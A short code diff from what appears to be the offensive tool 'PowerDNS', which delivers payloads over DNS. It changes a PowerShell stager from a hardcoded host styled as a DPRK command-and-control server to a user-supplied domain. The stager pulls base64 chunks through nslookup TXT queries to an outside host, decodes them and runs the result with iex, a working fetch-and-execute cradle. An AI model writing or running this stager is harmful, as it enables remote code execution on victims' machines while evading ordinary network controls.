@@ -75,7 +75,7 @@ try:
     signal.signal(signal.SIGINT, signal_handler)
     chunks = get_chunks(args.file)
     domain = args.domain
-    STAGER_CMD = "for ($i=1;$i -le %s;$i++){$b64+=iex(nslookup -q=txt -timeout=3 $i'.dprk-c2-server.co.uk')[-1]};iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(($b64))))" % (str(len(chunks)))
+    STAGER_CMD = "for ($i=1;$i -le %s;$i++){$b64+=iex(nslookup -q=txt -timeout=3 $i'.%s')[-1]};iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(($b64))))" % (str(len(chunks)), domain)
 
     print("\033[1;34m[*] PowerDNS:\033[0;0m Splitting %s in to %s chunk(s)" % (args.file, str(len(chunks))))
     chunks.insert(0,STAGER_CMD)
